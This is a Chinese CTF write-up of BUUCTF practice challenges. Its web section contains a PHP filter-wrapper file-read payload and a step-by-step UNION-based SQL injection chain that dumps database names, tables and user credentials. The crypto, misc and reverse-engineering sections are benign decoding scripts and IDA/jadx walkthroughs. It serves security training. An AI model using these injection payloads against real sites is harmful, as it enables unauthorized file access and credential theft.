# BUUCTF-伪协议-jadx

第五周 4.1

**目录**

[TOC]





## WEB

### [极客大挑战 2019]Secret

打开环境



<img src="https://i-blog.csdnimg.cn/blog_migrate/a8c7f63e78d0da17db4ed67b59b8aeb1.png" alt="" style="max-height:682px; box-sizing:content-box;" />


没有想法 查看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/70a6c4235e1db1d99578cccd78d2cf10.png" alt="" style="max-height:278px; box-sizing:content-box;" />


发现跳转

我们进入页面查看



<img src="https://i-blog.csdnimg.cn/blog_migrate/498c0604a464e1625f210a88ee1f058a.png" alt="" style="max-height:667px; box-sizing:content-box;" />


有一个点击按钮 然后我们进行点击



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce5ffb58fb649143f86376fa126cceb4.png" alt="" style="max-height:518px; box-sizing:content-box;" />


说结束了 我们就进行抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/0f79c7d75a51b258324248c65454dbf7.png" alt="" style="max-height:526px; box-sizing:content-box;" />


得到一个新的页面 我们进行访问



<img src="https://i-blog.csdnimg.cn/blog_migrate/6a5dda04bca2d002c17fb1cd0c6644e3.png" alt="" style="max-height:544px; box-sizing:content-box;" />


进入得到源代码 进行代码审计 发现flag 并且过滤了一些伪协议

我们使用filter伪协议查看

```cobol
secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8425dcf3988e50b2af3f3d58bcbbbc57.png" alt="" style="max-height:575px; box-sizing:content-box;" />




返回数值 然后进行解密

```cobol
<!DOCTYPE html>
 
<html>
 
    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>
 
    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{48aa1a90-6ce2-4b9c-8e07-1c71d8361cda}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>
 
</html>
```

得到flag

### [极客大挑战 2019]LoveSQL

打开环境



<img src="https://i-blog.csdnimg.cn/blog_migrate/fe246129f394c51fe8132c468e22066f.png" alt="" style="max-height:582px; box-sizing:content-box;" />


我们查看什么类型的注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/011f4041416a4401d3edcec7a87dd2f3.png" alt="" style="max-height:289px; box-sizing:content-box;" />


输入1' 得到反馈 是字符型注入

我们进行查看万能代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/dee2be9f385069bb8b6a8a9afd97d965.png" alt="" style="max-height:407px; box-sizing:content-box;" />


```csharp
用户名 ：1'or 1=1#
密码随便
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/835bb98e4ce85474cdcd72422a996408.png" alt="" style="max-height:417px; box-sizing:content-box;" />


我们继续提交 发现flag错误 我们重新返回注入 因为得到了admin 正确的用户名 我们就可以尝试进行sql注入

```vbnet
admin' order by 4#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9bb80517fc4b7c2b83f1e9f823e64aff.png" alt="" style="max-height:269px; box-sizing:content-box;" />


三个字段

查看回显点



```csharp
0' union select 1,2,3#
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/9e7661c367f7e44495f1b91e65c81503.png" alt="" style="max-height:522px; box-sizing:content-box;" />


得到回显点 我们在2 3 进行sql注入

```cobol
爆数据库
0' union select 1,2,database()#
爆表名
0' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()#
爆字段
0' union select 1,2,group_concat(column_name)from information_schema.columns where table_name ='l0ve1ysq1'#
爆出内容
0' union select 1,2,group_concat(id,username,password)from geek.l0ve1ysq1#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/17f86dfb83b1b7b51b049b203089768b.png" alt="" style="max-height:360px; box-sizing:content-box;" />


得到flag

## Crypto

### 变异凯撒

凯撒密码 打开ASCII对比

```cobol
afZ_r9VYfScOeO_UL^RWUc
=flag{}
 
a = 97  f=102   差5
f=102 l=108     差6
发现差 5+n个
```

编写脚本

```cobol
a = 'afZ_r9VYfScOeO_UL^RWUc'
flag = ''
p = 0
for i in a:
    flag+=chr(ord(i)+5+p)
    p+=1
print(flag)
```

得到flag

```undefined
flag{Caesar_variation}
```

### Quoted-printable

新品种 我们进行搜索

得到在线解码



<img src="https://i-blog.csdnimg.cn/blog_migrate/61f19c6626eb1c7fd2e1a86549e29243.png" alt="" style="max-height:378px; box-sizing:content-box;" />


我们查看这种编码原理

 [CTF-MISC总结](https://article.itxueyuan.com/7DyrkD) 

```cobol
8   bit   的字符用两个16进制数值表示，然后在前面加“=”。
```

## Misc

### 基础破解

告诉我们四个数字





暴力破解



<img src="https://i-blog.csdnimg.cn/blog_migrate/e093ebda3e071f84f2024d50a9255fcd.png" alt="" style="max-height:195px; box-sizing:content-box;" />




```cobol
ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=
```

base64解码



<img src="https://i-blog.csdnimg.cn/blog_migrate/843ed32978bf652bec63b5f36ca52a7c.png" alt="" style="max-height:431px; box-sizing:content-box;" />


### 文件中的秘密

下载文件到属性中



<img src="https://i-blog.csdnimg.cn/blog_migrate/d0b88c5f744a479d308010239944dcdd.png" alt="" style="max-height:658px; box-sizing:content-box;" />


得到flag

## Reverse

### helloword

下载文件 是apk 安卓文件 放入jadx中

搜索flag{

得到



<img src="https://i-blog.csdnimg.cn/blog_migrate/4f14e29d8ae39dc4fd655c91e008d48f.png" alt="" style="max-height:756px; box-sizing:content-box;" />


### reverse3

下载文件查壳 没有加壳 然后放入ida32

```cobol
SHIDT+F12
```

过滤字符串



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e50906c15d1519ae527ae0fa8e302ba.png" alt="" style="max-height:242px; box-sizing:content-box;" />


发现有关flag的 我们进行

```swift
CTRL+X
```

查看使用

<img src="https://i-blog.csdnimg.cn/blog_migrate/61e79cb0c3af1dc1e3819a4c3bc1fd23.png" alt="" style="max-height:182px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/1f2b4c09587f0cee47b66f3340bae1aa.png" alt="" style="max-height:730px; box-sizing:content-box;" />


我们看到关键的right flag的地方

```cobol
 if ( !strncmp(Dest, Str2, v2) )
    sub_41132F("rigth flag!\n");
 
判断dest和str2是不是一样的 如果一样输出right flag 
就是用户输入flag 经过转换后 如果和str2一样
那么就是正确的flag
```

我们找Dest的内容

```cobol
strncpy(Dest, v1, 0x28u);
  v8 = j_strlen(Dest);
  for ( j = 0; j < v8; ++j )
    Dest[j] += j;
 
 
将v1 copy给dest
循环 v8次然后将  dest[j]=dest[j]+j
 
 
就是
dest[0]=dest[0]+0
dest[1]=dest[1]+1
 
所以我们的flag
flag+=dest[j]-j
```

我们查看str2的内容 双击str2



<img src="https://i-blog.csdnimg.cn/blog_migrate/5cbcf81f8b17b11e34ddb0880ceae23b.png" alt="" style="max-height:90px; box-sizing:content-box;" />


得到比对的字符串

我们得到这些可以开始写exp了

但是前面还有语句

```cobol
 v1 = (const char *)sub_4110BE((int)&Str, v0, (int)&v11);
```

对v1的判断 因为是把v1赋值给dest的 所以我们要看这是什么函数

我们双击进入sub_4110BE 看看做了什么



<img src="https://i-blog.csdnimg.cn/blog_migrate/a4e28e67c90c6a4488820f93478f5844.png" alt="" style="max-height:926px; box-sizing:content-box;" />


好长 我们继续看看函数是什么



<img src="https://i-blog.csdnimg.cn/blog_migrate/68604dbcd88bde24b11cda1779704613.png" alt="" style="max-height:95px; box-sizing:content-box;" />


双击进这个



<img src="https://i-blog.csdnimg.cn/blog_migrate/385e189c0d23b6ced6eebfda2dcf5970.png" alt="" style="max-height:140px; box-sizing:content-box;" />


发现就是base64编码 那我们就可以猜测这就是将FLAG进行base64

```cobol
1.用户输入 flag
 
2.flag base64 加密
 
3.加密后 数组每一个都加1 
即 dest[j]+=j
 
4.进行比对 成功就输出right flag
```

我们进行写 exp

```python
import base64
 
 
a = "e3nifIH9b_C@n@dH"
flag = ""
for i  in range(len(a)):
    flag+= chr(ord(a[i])-i)
# print(flag)
print(base64.b64decode(flag))
```

得到flag

```csharp
b'{i_l0ve_you}'
```